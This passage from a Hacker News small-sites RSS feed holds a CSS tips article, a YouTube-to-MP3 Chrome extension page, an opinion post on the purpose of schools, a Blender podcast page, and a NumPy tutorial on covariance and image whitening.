<li>Increase/decrease counter value using <strong>counter-increment</strong></li>
<li>Use <strong>counter()</strong> or <strong>counters()</strong> function to display counter value from within the content property</li>
</ul>
<pre><code>ol.numbered-list &gt; li:before { 
  content: counter(li); 
  position: absolute; 
  box-sizing: border-box; 
  width: 45px; 
  height: 45px; 
  background: #f3b70f; 
  border-radius: 50%; 
} 

ol.numbered-list li { 
  position: relative; 
  left: 0px; 
  list-style: none; 
  counter-increment: li; 
}</code></pre>
<h4>14. ::selection</h4>
<p>With the "<strong>::selection</strong>" pseudo-element you can change the color of text selection by overriding at browser level to replace the color of text highlight with your defined color option. Your chosen color would appear when the content is selected using the cursor.</p>
<pre><code>:selection { 
  background-color: #f3b70f; 
}</code></pre>
<h4>15. Styling Broken Images</h4>
<p>Poor web designs don’t often have a way to manage broken images, and whenever an image is missing, the webpage doesn’t look good. Considering that the problem may arise now and then, advanced CSS could be used to styling broken images and make your custom error messages look presentable to the visitors. Here’s how you can do that:</p>
<pre><code>img { 
  font-family: 'Helvetica'; 
  font-weight: 300; 
  line-height: 2;   
  text-align: center; 
  width: 100%; 
  height: auto; 
  display: block; 
  position: relative; 
} 

img:before {  
  content: "We're sorry, the image below is broken :("; 
  display: block; 
  margin-bottom: 10px; 
} 

img:after {  
  content: "(url: " attr(src) ")"; 
  display: block; 
  font-size: 12px; 
}</code></pre>
<p>Here, we use <strong>:before</strong> and <strong>:after</strong> pseudo-classes to display error messages in case of a missing/broken image. The value of <strong>src</strong> property is returned using <strong>attr()</strong> function in CSS, displaying the faulty URLs.</p>
<h4>16. @support</h4>
<p>When using a CSS property that’s not supported by most web browsers, we advise using a feature query known as <strong>@support</strong> rule. It helps you to find out if the browser supports the CSS property: value pairs or not. Any code that you have put …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs">https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</a></em></p>]]>
            </description>
            <link>https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080203</guid>
            <pubDate>Fri, 13 Nov 2020 08:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[French museum suspends Genghis exhibition in reaction to Chinese censorship bid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079764">thread link</a>) | @rbecker
<br/>
November 12, 2020 | https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.rfi.fr/en/france/20201016-french-museum-suspends-genghis-exhibition-in-reaction-to-chinese-censorship-bid</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079764</guid>
            <pubDate>Fri, 13 Nov 2020 07:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OS108-9.1 XFCE amd64 released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25079641">thread link</a>) | @todsacerdoti
<br/>
November 12, 2020 | https://forums.os108.org/d/32-os108-91-xfce-amd64-released | <a href="https://web.archive.org/web/*/https://forums.os108.org/d/32-os108-91-xfce-amd64-released">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://forums.os108.org/d/32-os108-91-xfce-amd64-released</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079641</guid>
            <pubDate>Fri, 13 Nov 2020 06:39:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Client-side YouTube to MP3 using ffmpeg.js in a Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079455">thread link</a>) | @benkaiser
<br/>
November 12, 2020 | https://benkaiser.github.io/youtube-to-mp3/ | <a href="https://web.archive.org/web/*/https://benkaiser.github.io/youtube-to-mp3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>
      
      <h2>Installation</h2>
      <div>
        <div>
          <p>
            <a href="https://benkaiser.github.io/youtube-to-mp3/extension.zip">Download Extension Zip</a>
          </p>
          <p>
            Steps to Install:

            </p><ol>
              <li>Download extension zip file and unzip</li>
              <li>Navigate to chrome://extensions in your browser</li>
              <li>Enable developer mode in the top right</li>
              <li>Click "Load unpacked" in the top left</li>
            </ol>
          
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/instructions.png" alt="instructions picture">
        </p>
      </div>
      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.
        </p>
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/usage.gif" alt="using youtube to mp3">
        </p>
      </div>
    </div></div>]]>
            </description>
            <link>https://benkaiser.github.io/youtube-to-mp3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079455</guid>
            <pubDate>Fri, 13 Nov 2020 06:13:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The True Purpose of Schools]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079113">thread link</a>) | @dchacke
<br/>
November 12, 2020 | https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html | <a href="https://web.archive.org/web/*/https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<p>
  <iframe src="https://www.youtube-nocookie.com/embed/7RFlPmjUbRo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079113</guid>
            <pubDate>Fri, 13 Nov 2020 05:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bassam Kurdali on using Blender for open movie productions and education]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078788">thread link</a>) | @pabs3
<br/>
November 12, 2020 | https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html | <a href="https://web.archive.org/web/*/https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span>FOSS and Crafts</span> -- Thu 12 November 2020</p><div><p><a href="https://urchn.org/">Bassam Kurdali</a>
(<a href="https://mastodon.social/@bkurdali">Fediverse</a>, <a href="https://twitter.com/bkurdali">Twitter</a>)
talks about using <a href="https://www.blender.org/">Blender</a>
(a free and open source software suite for making 3d artwork)
for open movie projects such as <a href="https://orange.blender.org/">Elephants Dream</a>
(the world's first open movie project, which Bassam directed!)
and <a href="https://wiresforempathy.org/">Wires for Empathy</a>,
as well as use in teaching it to college students studying animation.</p><p><strong>Links:</strong></p><ul><li><a href="https://www.blender.org/">Blender</a></li><li><a href="https://urchn.org/">Urchin studios</a></li><li>Chicken Chair (we need a better link for this... check back later!)</li><li><a href="https://orange.blender.org/">Elephants Dream</a></li><li><a href="https://wiresforempathy.org/">Wires for Empathy</a> (aka "Tube")</li><li><a href="https://opentoonz.github.io/e/">OpenToonz</a></li><li><a href="https://www.charlielee.uk/boats-animator/">Boats Animator</a></li><li><a href="https://natrongithub.github.io/">Natron</a></li><li><a href="https://www.hampshire.edu/">Hampshire College</a></li><li><a href="https://www.risd.edu/">Rhode Island School of Design (RISD)</a></li><li><a href="https://cloud.blender.org/p/gallery/57e507b80fcf29412d1f1e53">Blender splash screens gallery</a></li></ul></div></div></div></div></div>]]>
            </description>
            <link>https://fossandcrafts.org/episodes/16-bassam-kurdali-blender-open-movies-education.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078788</guid>
            <pubDate>Fri, 13 Nov 2020 04:13:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What if you tried to catch a 1000 MPH baseball? [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078082">thread link</a>) | @rmason
<br/>
November 12, 2020 | https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more | <a href="https://web.archive.org/web/*/https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                                                                                <p>Just hit play. It's timestamped.</p><mediatag id="40379"></mediatag><p>td;dw: You would die. Expeditiously.</p>
                                    <!--                                 <p>
                    <span class="text-muted text-sm">Last Updated Nov 14th, 2020 at 2:47 am</span>
                </p>
                 -->
            </div>
        </div></div>]]>
            </description>
            <link>https://notthebee.com/article/ever-wonder-what-would-happen-if-you-got-smoked-by-a-baseball-traveling-at-1000-mph-wonder-no-more</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078082</guid>
            <pubDate>Fri, 13 Nov 2020 02:19:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pre-processing for deep learning: from covariance matrix to image whitening]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25078004">thread link</a>) | @sebg
<br/>
November 12, 2020 | https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/ | <a href="https://web.archive.org/web/*/https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> Essential Math for Data Science</p><p>I just released my book "Essential Math for Data Science"🎉.<br> Get it before the 30th of November 2020 and benefit from a <b>HUGE DISCOUNT</b>!</p><p><a href="https://www.essentialmathfordatascience.com/"> <b>GET THE BOOK</b> </a></p></div><p><a href="https://www.essentialmathfordatascience.com/"> <img src="https://hadrienj.github.io/assets/images/cover.jpg" width="40%"> </a></p></div><p><em>Last update: Jan. 2020</em></p><p>A notebook version of this post can be found <a href="https://github.com/hadrienj/Preprocessing-for-deep-learning">here</a> on Github.</p><p>The goal of this post/notebook is to go from the basics of data preprocessing to modern techniques used in deep learning. My point is that we can use code (Python/Numpy etc.) to better understand abstract mathematical notions! Thinking by coding! 💥</p><p>We will start with basic but very useful concepts in data science and machine learning/deep learning like variance and covariance matrix and we will go further to some preprocessing techniques used to feed images into neural networks. We will try to get more concrete insights using code to actually see what each equation is doing!</p><p>We call preprocessing all transformations on the raw data before it is fed to the machine learning or deep learning algorithm. For instance, training a convolutional neural network on raw images will probably lead to bad classification performances (<a href="https://ieeexplore.ieee.org/document/7808140/">Pal &amp; Sudeep, 2016</a>). The preprocessing is also important to speed up training (for instance, centering and scaling techniques, see <a href="http://yann.lecun.com/exdb/publis/pdf/lecun-98b.pdf">Lecun et al., 2012; see 4.3</a>).</p><p>Here is the syllabus of this tutorial:</p><ol><li><p><strong>Background</strong>: In the first part, we will get some reminders about variance and covariance and see how to generate and plot fake data to get a better understanding of these concepts.</p></li><li><p><strong>Preprocessing</strong>: In the second part, we will see the basics of some preprocessing techniques that can be applied to any kind of data: mean normalization, standardisation and whitening.</p></li><li><p><strong>Whitening images</strong>: In the third part, we will use the tools and concepts gained in 1. and 2. to do a special kind of whitening called Zero Component Analysis (ZCA). It can be used to preprocess images for deep learning. This part will be very practical and fun ☃️!</p></li></ol><p>Feel free to fork the notebook. For instance, check the shapes of the matrices each time you have a doubt :)</p><h2 id="a-variance-and-covariance">A. Variance and covariance</h2><p>The variance of a variable describes how much the values are spread. The covariance is a measure that tells the amount of dependency between two variables. A positive covariance means that values of the first variable are large when values of the second variables are also large. A negative covariance means the opposite: large values from one variable are associated with small values of the other. The covariance value depends on the scale of the variable so it is hard to analyse it. It is possible to use the correlation coefficient that is easier to interpret. It is just the covariance normalized.</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/negative-and-positive-covariance.png" width="500" alt="Intuition about the covariance between two variables" title="Representation of the covariance between two variables."> <em>A positive covariance means that large values of one variable are associated with big values from the other (left). A negative covariance means that large values of one variable are associated with small values of the other one (right).</em></p><p>The covariance matrix is a matrix that summarizes the variances and covariances of a set of vectors and it can tell a lot of things about your variables. The diagonal corresponds to the variance of each vector:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance1.png" width="400" alt="Variance in the matrix of covariance" title="Variance in the matrix of covariance is on the diagonal"> <em>A matrix $\bs{A}$ and its matrix of covariance. The diagonal corresponds to the variance of each column vector.</em></p><p>Let’s just check with the formula of the variance:</p><p>$ V(\bs{X}) = \frac{1}{n}\sum_{i=1}^{n}(x_i-\bar{x})^2 $</p><p>with $n$ the length of the vector, and $\bar{x}$ the mean of the vector. For instance, the variance of the first column vector of $\bs{A}$ is:</p><p>$ V(\bs{A}_{:,1}) = \frac{(1-3)^2+(5-3)^2+(3-3)^2}{3} = 2.67 $</p><p>This is the first cell of our covariance matrix. The second element on the diagonal corresponds of the variance of the second column vector from $\bs{A}$ and so on.</p><p><em>Note</em>: the vectors extracted from the matrix $\bs{A}$ correspond to the columns of $\bs{A}$.</p><h3 id="covariance">Covariance</h3><p>The other cells correspond to the covariance between two column vectors from $\bs{A}$. For instance, the covariance between the first and the third column is located in the covariance matrix as the column 1 and the row 3 (or the column 3 and the row 1).</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance2.png" width="400" alt="Covariance in the matrix of covariance" title="The position in the covariance matrix."> <em>The position in the covariance matrix. Column corresponds to the first variable and row to the second (or the opposite). The covariance between the first and the third column vector of $\bs{A}$ is the element in column 1 and row 3 (or the opposite = same value).</em></p><p>Let’s check that the covariance between the first and the third column vector of $\bs{A}$ is equal to $-2.67$. The formula of the covariance between two variables $\bs{X}$ and $\bs{Y}$ is:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The variables $\bs{X}$ and $\bs{Y}$ are the first and the third column vectors in the last example. Let’s split this formula to be sure that it is crystal clear:</p><ol><li>$(x_1-\bar{x})$. The sum symbol means that we will iterate on the elements of the vectors. We will start with the first element ($i=1$) and calculate the first element of $\bs{X}$ minus the mean of the vector $\bs{X}$.</li><li>$(x_1-\bar{x})(y_1-\bar{y})$. Multiply the result with the first element of $\bs{Y}$ minus the mean of the vector $\bs{Y}$.</li><li>$\sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Reiterate the process for each element of the vectors and calculate the sum of all results.</li><li>$\frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y})$. Divide by the number of elements in the vector.</li></ol><h4 id="example-1">Example 1.</h4><p>Let’s start with the matrix $\bs{A}$:</p><p>$ \boldsymbol{A}= \begin{bmatrix} 1 &amp; 3 &amp; 5 \\ 5 &amp; 4 &amp; 1 \\ 3 &amp; 8 &amp; 6 \end{bmatrix} $</p><p>We will calculate the covariance between the first and the third column vectors:</p><p>$ \boldsymbol{X} = \begin{bmatrix} 1 \\ 5 \\ 3 \end{bmatrix} $</p><p>and</p><p>$\boldsymbol{Y} = \begin{bmatrix} 5 \\ 1 \\ 6 \end{bmatrix} $</p><p>$\boldsymbol{\bar{x}}=3$, $\boldsymbol{\bar{y}}=4$ and $n=3$ so we have:</p><p>$ cov(X,Y) = \frac{(1-3)(5-4)+(5-3)(1-4)+(3-3)(6-4)}{3}=\frac{-8}{3}=-2.67 $</p><p>Ok, great! That the value of the covariance matrix.</p><p>Now the easy way! With Numpy, the covariance matrix can be calculated with the function <code>np.cov</code>. It is worth noting that if you want Numpy to use the columns as vectors, the parameter <code>rowvar=False</code> has to be used. Also, <code>bias=True</code> allows to divide by $n$ and not by $n-1$.</p><p>Let’s create the array first:</p><div><div><pre><code><span>A</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>1</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>],</span> <span>[</span><span>5</span><span>,</span> <span>4</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>3</span><span>,</span> <span>8</span><span>,</span> <span>6</span><span>]])</span>
<span>A</span>
</code></pre></div></div><pre>array([[1, 3, 5],
       [5, 4, 1],
       [3, 8, 6]])
</pre><p>Now we will calculate the covariance with the Numpy function:</p><div><div><pre><code><span>np</span><span>.</span><span>cov</span><span>(</span><span>A</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
</code></pre></div></div><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>Looks good!</p><h3 id="finding-the-covariance-matrix-with-the-dot-product">Finding the covariance matrix with the dot product</h3><p>There is another way to compute the covariance matrix of $\bs{A}$. You can center $ \bs{A}$ around 0 (subtract the mean of the vector to each element of the vector to have a vector of mean equal to 0, <em>cf</em>. below), multiply it with its own transpose and divide by the number of observations. Let’s start with an implementation and then we’ll try to understand the link with the previous equation:</p><div><div><pre><code><span>def</span> <span>calculateCovariance</span><span>(</span><span>X</span><span>):</span>
    <span>meanX</span> <span>=</span> <span>np</span><span>.</span><span>mean</span><span>(</span><span>X</span><span>,</span> <span>axis</span> <span>=</span> <span>0</span><span>)</span>
    <span>lenX</span> <span>=</span> <span>X</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
    <span>X</span> <span>=</span> <span>X</span> <span>-</span> <span>meanX</span>
    <span>covariance</span> <span>=</span> <span>X</span><span>.</span><span>T</span><span>.</span><span>dot</span><span>(</span><span>X</span><span>)</span><span>/</span><span>lenX</span>
    <span>return</span> <span>covariance</span>
</code></pre></div></div><p>Let’s test it on our matrix $\boldsymbol{A}$:</p><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>We end up with the same result as before!</p><p>The explanation is simple. The dot product between two vectors can be expressed:</p><p>$ \bs{X^\text{T}Y}= \sum_{i=1}^{n}(x_i)(y_i) $</p><p>That’s right, it is the sum of the products of each element of the vectors:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/dot-product.png" width="400" alt="The dot product corresponds to the sum of the products of each elements of the vectors" title="The dot product."> <em>The dot product corresponds to the sum of the products of each element of the vectors.</em></p><p>If $n$ is the number of elements in our vectors and that we divide by $n$:</p><p>$ \frac{1}{n}\bs{X^\text{T}Y}= \frac{1}{n}\sum_{i=1}^{n}(x_i)(y_i) $</p><p>You can note that this is not too far from the formula of the covariance we have seen above:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The only difference is that in the covariance formula we subtract the mean of a vector to each of its elements. This is why we need to center the data before doing the dot product.</p><p>Now if we have a matrix $\bs{A}$, the dot product between $\bs{A}$ and its transpose will give you a new matrix:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance-dot-product.png" width="400" alt="Covariance matrix and dot product" title="Covariance matrix and dot product."> <em>If you start with a zero-centered matrix, the dot product between this matrix and its transpose will give you the variance of each vector and covariance between them, that is to say the covariance matrix.</em></p><p>This is the covariance matrix! 🌵</p><h2 id="b-visualize-data-and-covariance-matrices">B. Visualize data and covariance matrices</h2><p>In order to get more insights about the covariance matrix and how it can be useful, we will create a function used to visualize it along with 2D data. You will be able to see the link between the covariance matrix and the data.</p><p>This function will calculate the covariance matrix as we have seen above. It will create two subplots: one for the covariance matrix and one for the data. The <code>heatmap</code> function from Seaborn is used to create gradients of color: small values will be colored in light green and large values in dark blue. The data is represented as a scatterplot. We choose one of our palette colors, but you may prefer other colors 🌈.</p><div><div><pre><code><span>def</span> <span>plotDataAndCov</span><span>(</span><span>data</span><span>):</span>
    <span>ACov</span> <span>=</span> <span>np</span><span>.</span><span>cov</span><span>(</span><span>data</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
    <span>print</span> <span>'Covariance matrix:</span><span>\n</span><span>'</span><span>,</span> <span>ACov</span>

    <span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>nrows</span><span>=</span><span>1</span><span>,</span> <span>ncols</span><span>=</span><span>2</span><span>)</span>
    <span>fig</span><span>.</span><span>set_size_inches</span><span>(</span><span>10</span><span>,</span> <span>10</span><span>)</span>

    <span>ax0</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>

    <span># Choosing the colors
</span>    <span>cmap</span> <span>=</span> <span>sns</span><span>.</span><span>color_palette</span><span>(</span><span>"GnBu"</span><span>,</span> <span>10</span><span>)</span>
    <span>sns</span><span>.</span><span>heatmap</span><span>(</span><span>ACov</span><span>,</span> <span>cmap</span><span>=</span><span>cmap</span><span>,</span> <span>vmin</span><span>=</span><span>0</span><span>)</span>

    <span>ax1</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>)</span>

    <span># data can include the colors
</span>    <span>if</span> <span>data</span><span>.</span><span>shape</span><span>[</span><span>1</span><span>]</span><span>==</span><span>3</span><span>:</span>
        <span>c</span><span>=</span><span>data</span><span>[:,</span><span>2</span><span>]</span>
    <span>else</span><span>:</span>
        <span>c</span><span>=</span><span>"#0A98BE"</span>
    <span>ax1</span><span>.</span><span>scatter</span><span>(</span><span>data</span><span>[:,</span><span>0</span><span>],</span> <span>data</span><span>[:,</span><span>1</span><span>],</span> <span>c</span><span>=</span><span>c</span><span>,</span> <span>s</span><span>=</span><span>40</span><span>)</span>

    <span># Remove the top and right axes from the data plot
</span>    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'right'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'top'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
</code></pre></div></div><h2 id="c-simulating-data">C. Simulating data</h2><p>Now that we have the plot function, we will generate some random data to visualize what the covariance matrice can tell us. We will start with some data drawn from …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</a></em></p>]]>
            </description>
            <link>https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078004</guid>
            <pubDate>Fri, 13 Nov 2020 02:05:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jason Scott: Your Pal, the Internet Archive, and how to use it. [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077936">thread link</a>) | @toomuchtodo
<br/>
November 12, 2020 | https://www.twitch.tv/videos/797446891?t=0h20m45s | <a href="https://web.archive.org/web/*/https://www.twitch.tv/videos/797446891?t=0h20m45s">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/videos/797446891?t=0h20m45s</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077936</guid>
            <pubDate>Fri, 13 Nov 2020 01:53:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Failure in Small Town Ontario (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077860">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086 | <a href="https://web.archive.org/web/*/https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bradford West Gwillimbury voters have until Oct. 23 at 8 p.m. to cast their ballots</p><div id="details-body" data-words="437" itemprop="articleBody">
